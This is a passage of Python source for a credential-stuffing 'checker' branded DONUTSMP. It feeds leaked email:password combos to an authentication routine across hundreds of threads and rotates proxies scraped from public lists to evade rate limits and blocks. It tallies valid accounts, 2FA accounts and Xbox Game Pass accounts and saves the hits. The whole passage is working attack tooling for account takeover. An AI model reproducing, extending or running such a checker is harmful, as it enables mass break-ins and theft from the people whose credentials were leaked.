    print(f"{Fore.MAGENTA} [{mfa}] MFA{Style.RESET_ALL}")
    print(f"{Fore.LIGHTMAGENTA_EX} [{twofa}] 2FA{Style.RESET_ALL}")
    print(f"{Fore.LIGHTGREEN_EX} [{xgp}] Xbox Game Pass{Style.RESET_ALL}")
    print(f"{Fore.LIGHTGREEN_EX} [{xgpu}] Xbox Game Pass Ultimate{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} [{other}] Other{Style.RESET_ALL}")
    print(f"{Fore.LIGHTMAGENTA_EX} [{vm}] Valid Mail{Style.RESET_ALL}")
    print(f"{Fore.YELLOW} [{retries}] Retries{Style.RESET_ALL}")
    print(f"{Fore.RED} [{errors}] Errors{Style.RESET_ALL}")
    
    utils.set_title(f"🍩 DONUTSMP CHECKER 🍩 | Checked: {checked}/{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    
    time.sleep(1)
    threading.Thread(target=cuiscreen).start()

def enhanced_ui():
    """Enhanced UI with progress bars and more detailed statistics"""
    global cpm, cpm1, checked, hits, bad, twofa, sfa, mfa, xgp, xgpu, other, vm, retries, errors, start_time
    
    os.system('cls')
    print(logo)
    
    # Calculate statistics
    with stats_lock:
        elapsed_time = time.time() - start_time
        cpm_current = cpm
        cpm = 0
        
        # Calculate progress percentage
        progress_percentage = calculate_percentage(checked, len(Combos))
        
        # Create progress bar
        progress_bar = create_progress_bar(progress_percentage)
        
        # Calculate time remaining
        if cpm_current > 0:
            remaining_combos = len(Combos) - checked
            estimated_time_remaining = remaining_combos / (cpm_current / 60)  # in seconds
            time_remaining_str = format_time_elapsed(estimated_time_remaining)
        else:
            time_remaining_str = "Calculating..."
        
        # Calculate hit rate
        total_processed = hits + bad + twofa + vm
        hit_rate = calculate_percentage(hits, total_processed) if total_processed > 0 else 0
    
    # Print statistics
    print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║                    🍩 DONUTSMP CHECKER 🍩                    ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║                      ENHANCED UI                       ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}Progress:{Style.RESET_ALL}")
    print(f"{Fore.GREEN}  {checked}/{len(Combos)} Checked {progress_bar}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}  Time Elapsed: {format_time_elapsed(elapsed_time)} | Estimated Remaining: {time_remaining_str}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}  CPM: {cpm_current*60} | Hit Rate: {hit_rate:.1f}%{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}Results:{Style.RESET_ALL}")
    print(f"{Fore.GREEN}  🎯 Hits: {hits} {Style.DIM}({calculate_percentage(hits, checked):.1f}%){Style.RESET_ALL}")
    print(f"{Fore.RED}  ❌ Bad: {bad} {Style.DIM}({calculate_percentage(bad, checked):.1f}%){Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}  🔒 2FA: {twofa} {Style.DIM}({calculate_percentage(twofa, checked):.1f}%){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  ✉ Valid Mail: {vm} {Style.DIM}({calculate_percentage(vm, checked):.1f}%){Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}Account Types:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  👤 SFA: {sfa} {Style.DIM}({calculate_percentage(sfa, checked):.1f}%){Style.RESET_ALL}")
    print(f"{Fore.CYAN}  🔐 MFA: {mfa} {Style.DIM}({calculate_percentage(mfa, checked):.1f}%){Style.RESET_ALL}")
    print(f"{Fore.LIGHTGREEN_EX}  🎮 Xbox Game Pass: {xgp} {Style.DIM}({calculate_percentage(xgp, checked):.1f}%){Style.RESET_ALL}")
    print(f"{Fore.LIGHTGREEN_EX}  🎮 Xbox Game Pass Ultimate: {xgpu} {Style.DIM}({calculate_percentage(xgpu, checked):.1f}%){Style.RESET_ALL}")
    print(f"{Fore.LIGHTYELLOW_EX}  📦 Other: {other} {Style.DIM}({calculate_percentage(other, checked):.1f}%){Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}System:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  🔄 Retries: {retries} {Style.DIM}({calculate_percentage(retries, checked):.1f}%){Style.RESET_ALL}")
    print(f"{Fore.RED}  ⚠ Errors: {errors} {Style.DIM}({calculate_percentage(errors, checked):.1f}%){Style.RESET_ALL}")
    
    # Update window title
    utils.set_title(f"🍩 DONUTSMP CHECKER 🍩 | {checked}/{len(Combos)} | Hits: {hits} | CPM: {cpm_current*60}")
    
    time.sleep(1)
    threading.Thread(target=enhanced_ui).start()

def finishedscreen():
    """Display the final results screen"""
    os.system('cls')
    print(logo)
    print()
    print(f"{Fore.LIGHTGREEN_EX}Finished Checking!{Style.RESET_ALL}")
    print()
    
    # Calculate total time
    total_time = time.time() - start_time
    total_time_str = format_time_elapsed(total_time)
    
    # Calculate final statistics
    with stats_lock:
        total_processed = hits + bad + twofa + vm
        hit_rate = calculate_percentage(hits, total_processed) if total_processed > 0 else 0
    
    print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║                    🍩 FINAL RESULTS 🍩                     ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}Summary:{Style.RESET_ALL}")
    print(f"{Fore.BLUE}  Total Combos: {len(Combos)}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}  Total Processed: {total_processed}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}  Total Time: {total_time_str}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}  Average CPM: {(total_processed / (total_time / 60)):.1f}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}  Hit Rate: {hit_rate:.1f}%{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}Results:{Style.RESET_ALL}")
    print(f"{Fore.GREEN}  🎯 Hits: {hits}{Style.RESET_ALL}")
    print(f"{Fore.RED}  ❌ Bad: {bad}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}  🔒 2FA: {twofa}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  ✉ Valid Mail: {vm}{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}Account Types:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  👤 SFA: {sfa}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  🔐 MFA: {mfa}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTGREEN_EX}  🎮 Xbox Game Pass: {xgp}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTGREEN_EX}  🎮 Xbox Game Pass Ultimate: {xgpu}{Style.RESET_ALL}")
    print(f"{Fore.LIGHTYELLOW_EX}  📦 Other: {other}{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}System:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  🔄 Retries: {retries}{Style.RESET_ALL}")
    print(f"{Fore.RED}  ⚠ Errors: {errors}{Style.RESET_ALL}")
    
    print(f"\n{Fore.LIGHTRED_EX}Press any key to exit.{Style.RESET_ALL}")
    repr(readchar.readkey())
    os.abort()

def getproxy():
    """Get a proxy from the list"""
    if proxytype == "'5'": 
        if proxylist:
            return random.choice(proxylist)
        return None
    
    if proxytype != "'4'" and proxylist: 
        proxy = random.choice(proxylist)
        if proxytype == "'1'": 
            return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype == "'2'": 
            return {'http': 'socks4://'+proxy, 'https': 'socks4://'+proxy}
        elif proxytype == "'3'" or proxytype == "'4'": 
            return {'http': 'socks5://'+proxy, 'https': 'socks5://'+proxy}
    
    return None

def Checker(combo):
    """Check a single combo"""
    global bad, checked, cpm
    
    try:
        email, password = combo.strip().replace(' ', '').split(":")
        if email != "" and password != "":
            authenticate(str(email), str(password))
        else:
            if screen == "'2'": 
                logger.info(f"Bad: {combo.strip()}")
            with stats_lock:
                bad += 1
                cpm += 1
                checked += 1
    except Exception as e:
        logger.error(f"Error in Checker: {e}")
        if screen == "'2'": 
            logger.info(f"Bad: {combo.strip()}")
        with stats_lock:
            bad += 1
            cpm += 1
            checked += 1

def get_proxies():
    """Scrape proxies from various sources"""
    global proxylist
    
    http = []
    socks4 = []
    socks5 = []
    
    # Updated proxy sources for 2023-2024
    api_http = [
        "https://api.proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt"
    ]
    
    api_socks4 = [
        "https://api.proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks4",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/socks4.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt"
    ]
    
    api_socks5 = [
        "https://api.proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks5",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/socks5.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/socks5.txt"
    ]
    
    # Fetch HTTP proxies
    for service in api_http:
        try:
            response = requests.get(service, timeout=10)
            if response.status_code == 200:
                if 'geonode.com' in service:
                    # Parse JSON response from Geonode
                    data = response.json()
                    for proxy in data.get('data', []):
                        ip = proxy.get('ip')
                        port = proxy.get('port')
                        if ip and port:
                            http.append(f"{ip}:{port}")
                else:
                    # Parse text response from GitHub
                    proxies = response.text.strip().split('\n')
                    for proxy in proxies:
                        if proxy and ':' in proxy:
                            http.append(proxy)
        except Exception as e:
            logger.debug(f"Error fetching HTTP proxies: {e}")
    
    # Fetch SOCKS4 proxies
    for service in api_socks4:
        try:
            response = requests.get(service, timeout=10)
            if response.status_code == 200:
                if 'geonode.com' in service:
                    # Parse JSON response from Geonode
                    data = response.json()
                    for proxy in data.get('data', []):
                        ip = proxy.get('ip')
                        port = proxy.get('port')
                        if ip and port:
                            socks4.append(f"{ip}:{port}")
                else:
                    # Parse text response from GitHub
                    proxies = response.text.strip().split('\n')
                    for proxy in proxies:
                        if proxy and ':' in proxy:
                            socks4.append(proxy)
        except Exception as e:
            logger.debug(f"Error fetching SOCKS4 proxies: {e}")
    
    # Fetch SOCKS5 proxies
    for service in api_socks5:
        try:
            response = requests.get(service, timeout=10)
            if response.status_code == 200:
                if 'geonode.com' in service:
                    # Parse JSON response from Geonode
                    data = response.json()
                    for proxy in data.get('data', []):
                        ip = proxy.get('ip')
                        port = proxy.get('port')
                        if ip and port:
                            socks5.append(f"{ip}:{port}")
                else:
                    # Parse text response from GitHub
                    proxies = response.text.strip().split('\n')
                    for proxy in proxies:
                        if proxy and ':' in proxy:
                            socks5.append(proxy)
        except Exception as e:
            logger.debug(f"Error fetching SOCKS5 proxies: {e}")
    
    # Remove duplicates and convert to proper format
    http = list(set(http))
    socks4 = list(set(socks4))
    socks5 = list(set(socks5))
    
    proxylist.clear()
    for proxy in http: 
        proxylist.append({'http': 'http://'+proxy, 'https': 'http://'+proxy})
    for proxy in socks4: 
        proxylist.append({'http': 'socks4://'+proxy, 'https': 'socks4://'+proxy})
    for proxy in socks5: 
        proxylist.append({'http': 'socks5://'+proxy, 'https': 'socks5://'+proxy})
    
    if screen == "'2'": 
        logger.info(f"Scraped [{len(proxylist)}] proxies")
    
    # Schedule next scraping
    time.sleep(config.get('autoscrape', 5) * 60)
    get_proxies()

def check_for_updates():
    """Check for updates from GitHub"""
    if not config.get('check_updates', True):
        return
    
    try:
        response = requests.get(GITHUB_API, timeout=10)
        if response.status_code == 200:
            release_data = response.json()
            latest_version = release_data.get('tag_name', '').replace('v', '')
            
            if latest_version and latest_version != VERSION:
                print(f"{Fore.YELLOW}New version available: {latest_version} (current: {VERSION}){Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Download at: {GITHUB_REPO}/releases{Style.RESET_ALL}")
                
                if config.get('auto_update', False):
                    # Auto-update functionality would go here
                    print(f"{Fore.YELLOW}Auto-update is enabled but not implemented yet.{Style.RESET_ALL}")
    except Exception as e:
        logger.debug(f"Error checking for updates: {e}")

def Main():
    """Main function"""
    global proxytype, screen, start_time
    
    utils.set_title("🍩 DONUTSMP CHECKER 🍩")
    os.system('cls')
    
    try:
        # Load configuration
        if not config.load_config():
            print(f"{Fore.RED}There was an error loading the config. Please delete the old config and reopen the checker.{Style.RESET_ALL}")
            input()
            exit()
    except Exception as e:
        print(f"{Fore.RED}There was an error loading the config: {e}{Style.RESET_ALL}")
        print(f"{Fore.RED}Please delete the old config and reopen the checker.{Style.RESET_ALL}")
        input()
        exit()
    
    # Check for updates
    check_for_updates()
    
    print(logo)
    
    try:
        print(f"{Fore.LIGHTBLACK_EX}(Recommended threads: 100-300. Use fewer threads if proxyless.){Style.RESET_ALL}")
        thread = int(input(f"{Fore.LIGHTBLUE_EX}Threads: {Style.RESET_ALL}"))
    except:
        print(f"{Fore.LIGHTRED_EX}Must be a number.{Style.RESET_ALL}") 
        time.sleep(2)
        Main()
    
    print(f"{Fore.LIGHTBLUE_EX}Proxy Type: [1] Http - [2] Socks4 - [3] Socks5 - [4] None - [5] Auto Scraper{Style.RESET_ALL}")
    proxytype = repr(readchar.readkey())
    cleaned = int(proxytype.replace("'", ""))
    if cleaned not in range(1, 6):
        print(f"{Fore.RED}Invalid Proxy Type [{cleaned}]{Style.RESET_ALL}")
        time.sleep(2)
        Main()
    
    print(f"{Fore.LIGHTBLUE_EX}Screen: [1] CUI - [2] Log - [3] Enhanced UI{Style.RESET_ALL}")
    screen = repr(readchar.readkey())
    
    print(f"{Fore.LIGHTBLUE_EX}Select your combos{Style.RESET_ALL}")
    Load()
    
    if proxytype != "'4'" and proxytype != "'5'":
        print(f"{Fore.LIGHTBLUE_EX}Select your proxies{Style.RESET_ALL}")
        Proxys()
    
    if proxytype == "'5'":
        print(f"{Fore.LIGHTGREEN_EX}Scraping Proxies Please Wait.{Style.RESET_ALL}")
        threading.Thread(target=get_proxies).start()
        while len(proxylist) == 0: 
            time.sleep(1)
    
    # Create results directory
    results_dir = Path("results") / datetime.now().strftime("%Y%m%d_%H%M%S")
    results_dir.mkdir(parents=True, exist_ok=True)
    logger.info(f"Results will be saved to: {results_dir}")
    
    # Update fname to use the timestamped directory
    fname = os.path.basename(results_dir)
    
    # Record start time
    start_time = time.time()
    
    # Initialize rate limiter
    rate_limiter = RateLimiter(
        max_requests=config.get('rate_limit_requests', 10),
        time_window=config.get('rate_limit_window', 1)
    )
    
    # Start UI based on user selection
    if screen == "'1'": 
        cuiscreen()
    elif screen == "'2'": 
        logscreen()
    elif screen == "'3'":
        enhanced_ui()
    else: 
        enhanced_ui()  # Default to enhanced UI
    
    # Process combos with thread pool
    max_threads = min(thread, config.get('max_threads', 300))
    min_threads = config.get('min_threads', 50)
    
    # Adjust thread count based on available memory if adaptive threading is enabled
    if config.get('adaptive_threading', True):
        try:
            import psutil
            memory_percent = psutil.virtual_memory().percent
            if memory_percent > 80:  # If memory usage is high, reduce threads
                max_threads = max(min_threads, int(max_threads * 0.7))
                logger.info(f"Reduced thread count to {max_threads} due to high memory usage ({memory_percent}%)")
        except ImportError:
            logger.debug("psutil not available, skipping adaptive threading")
    
    logger.info(f"Starting checker with {max_threads} threads")
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        # Submit all tasks
        futures = [executor.submit(Checker, combo) for combo in Combos]
        
        # Process tasks as they complete
        for future in as_completed(futures):
            try:
                future.result()  # Get the result or raise exception
            except Exception as e:
                logger.error(f"Error in task: {e}")
    
    finishedscreen()
    input()

if __name__ == "__main__":
    try:
        Main()
    except KeyboardInterrupt:
        logger.info("Checker interrupted by user")
    except Exception as e:
        logger.critical(f"Fatal error: {e}")
        logger.critical(traceback.format_exc())
        sys.exit(1)
